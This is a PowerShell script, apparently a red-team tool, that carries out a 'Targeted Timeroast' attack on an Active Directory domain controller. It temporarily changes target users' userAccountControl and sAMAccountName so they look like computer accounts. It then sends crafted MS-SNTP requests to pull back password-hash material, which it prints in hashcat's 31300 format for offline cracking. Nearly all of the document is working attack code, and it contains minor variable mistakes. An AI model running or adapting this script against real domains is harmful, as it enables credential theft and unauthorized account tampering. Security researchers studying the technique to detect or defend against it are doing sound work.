<#

.SYNOPSIS
    Performs a 'Targeted Timeroast' attack against a domain controller,
    manipulating users' userAccountControl to dump their hashes with MS-SNTP.
    Requires domain admin credentials and a domain-joined computer.
    Outputs the resulting hashes in the hashcat format 31300 with the
    --username flag ("<RID>:$sntp-ms$<hash>$salt")

.DESCRIPTION
    The userAccountControl attribute of every targeted user is modified
    to replace the NORMAL_ACCOUNT flag with WORKSTATION_TRUST_ACCOUNT
    and add a trailing $ to their sAMAccountName. This allows the retrieval
    of domain user password hashes with MS-SNTP, which can be cracked with
    hashcat's 31300 mode. The two attributes are restored to their original
    value after a hash is received.

.PARAMETER domainController
    Hostname or IP address of a domain controller that acts as NTP
    server.

.PARAMETER victim
    sAMAccountName of user to extract hash for.
    
.PARAMETER file
    List of users to extract hashes for, one sAMAccountName per line.

.PARAMETER outputFile
    Hash output file. Writes to stdout if omitted.

.PARAMETER rate
    NP queries to execute second per second. Higher is faster, but
    with a greater risk of dropped datagrams, resulting in possibly
    incomplete results. Default: 180.

.PARAMETER timeout
    Quit after not receiving NTP responses for TIMEOUT seconds,
    possibly indicating that RID space has been exhausted.
    Default: 24.

.PARAMETER sourcePort
    NTP source port to use. A dynamic unprivileged port is chosen by default.
    Could be set to 123 to get around a strict firewall.

.PARAMETER q
    Be quieter. Attributes won't be checked after being modified.
    Less noise but we can't be 100% certain the attributes were modified and restored correctly.

.Parameter v
    Verbose. Print operation steps.

.NOTES
    Timeroasting script by Jacopo (antipatico) Scannella,
    modified for Targeted Timeroasting by Giulio Pierantoni (https://medium.com/@offsecdeer).

#>
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$domainController,
    [string]$victim,
    [string]$file,
    [string]$outputFile,
    [int]$rate = 180,
    [int]$timeout = 24,
    [Uint16]$sourcePort,
    [switch]$v,
    [switch]$q
)

Import-Module ActiveDirectory

$newUac = 4096
$targets = @()

if ($victim -eq "" -and $file -eq "")
{
    Write-Host "[!] You must specify either a target name or a file!" -ForegroundColor Red
    Exit
}

if ($victim -ne "" -and $file -ne "")
{
    Write-Host "[!] Can't specify both a target name and a file!" -ForegroundColor Red
    Exit
}

if ($victim)
{
    $targets = @($victim)
}
else
{
    $targets = Get-Content $file
}

if ($outputFile)
{
    Out-Null > $outputFile
}

$oldVerbose = $VerbosePreference
if ($v)
{
    $VerbosePreference = "Continue"
}

$ErrorActionPreference = "Stop"
$NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)

if ($port -eq 0)
{
    $client = New-Object System.Net.Sockets.UdpClient
}
else
{
    $client = New-Object System.Net.Sockets.UdpClient($sourcePort)
}

$client.Client.ReceiveTimeout = [Math]::floor(1000/$rate)
$client.Connect($domainController, 123)

$timeoutTime = (Get-Date).AddSeconds($timeout)

foreach ($target in $targets)
{
    # Read original attributes
    try
    {
        $query = (Get-ADUser -Identity $target -Properties DistinguishedName,UserAccountControl)
    }
    catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException]
    {
        Write-Host "[!] Could not find user $target! Skipping." -ForegroundColor Red
        continue
    }
    
    $AdObj = New-Object System.Security.Principal.NTAccount($target)
    $sid = $AdObj.Translate([System.Security.Principal.SecurityIdentifier])
    $tag, $rid = ($sid.Value.ToString() -split '-')[0, -1]
    $oldUac = ($query).UserAccountControl
    $dn = ($query).DistinguishedName
    Write-Verbose "[*] sAMAccountName: $target. RID = $rid. userAccountControl = $oldUac"

    # Modify attributes to exploitable values
    $newSAM = ""
    if ($target.Remove(0,($target.Length - 1) -ne "$"))
    {
        $newSAM = $target + "$"
    }
    else
    {
        $newSAM = $target
    }

    Write-Verbose "[*] Updating sAMAccountName to $newSAM and userAccountControl to WORKSTATION_TRUST_ACCOUNT"
    Set-ADUser -Identity $dn -Replace @{userAccountControl=$newUac;samAccountName=$newSAM}

    # Check if attributes were modified successfully
    if (!$quiet)
    {
        $query = (Get-ADUser -Identity $dn -Properties SamAccountName,UserAccountControl)
        $uac = ($query).UserAccountControl
        $checkSAM = ($query).SamAccountName

        if (($newSAM -ne $checkSAM) -or ($newUac -ne $uac))
        {
            Write-Host "[!] Attributes weren't modified successfully for $target!" -ForegroundColor Red
            Write-Host "[!] SAM = $checkSAM, UAC = $uac" -ForegroundColor Red
            continue
        }
    }

    # Launch Timeroasting
    $query = $NTP_PREFIX + [BitConverter]::GetBytes([int]$rid) + [byte[]]::new(16)
    Write-Verbose "[*] Sending MS-SNTP request for RID $rid"
    
    try
    {
        [void] $client.Send($query, $query.Length)
        $reply = $client.Receive([ref]$null)
        
        if ($reply.Length -eq 68)
        {
            Write-Verbose "[*] We got a hash!"
            $salt = [byte[]]$reply[0..47]
            $md5Hash = [byte[]]$reply[-16..-1]
            $answerRid = ([BitConverter]::ToUInt32($reply[-20..-16], 0) -bxor $keyFlag)
            
            $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
            $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
            $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $rid, $hexMd5Hash, $hexSalt

            if ($outputFile)
            {
                $hashcatHash | Out-File -Append -FilePath $outputFile -Encoding ascii
            }
            else
            {
                Write-Host -ForegroundColor Green $hashcatHash
            }
            
            # Succesfull receive. Update total timeout
            $timeoutTime = (Get-Date).AddSeconds($timeout)
        }
        else
        {
            Write-Host "[!] Did not receive a proper reply for RID $rid. Restoring attributes." -ForegroundColor Red
        }   
    }
    catch [System.Management.Automation.MethodInvocationException]
    {
        # Time for next request
    }
    catch
    {
        Write-Host "[!] An exception was raised: $_"
    }
    finally
    {
        Write-Verbose "[*] Restoring attributes for $target"
        Set-ADUser -Identity $dn -Replace @{samAccountName=$target;userAccountControl=$oldUac}
        if (!$q)
        {
            $query = (Get-ADUser -Identity $dn -Properties SamAccountName,UserAccountControl)
            $uac = ($query).UserAccountControl
            $checkSAM = ($query).SamAccountName
            if (($uac -ne $oldUac) -or ($checkSAM -ne $target))
            {
                Write-Host "[!] Attributes weren't restored successfully for $target!" -ForegroundColor Red
                Write-Host "[*] SAM = $checkSAM, UAC = $uac" -ForegroundColor Red
            }
        }
    }
}

Write-Verbose "[*] No more targets. Quitting."
$VerbosePreference = $oldVerbose
$client.Close()
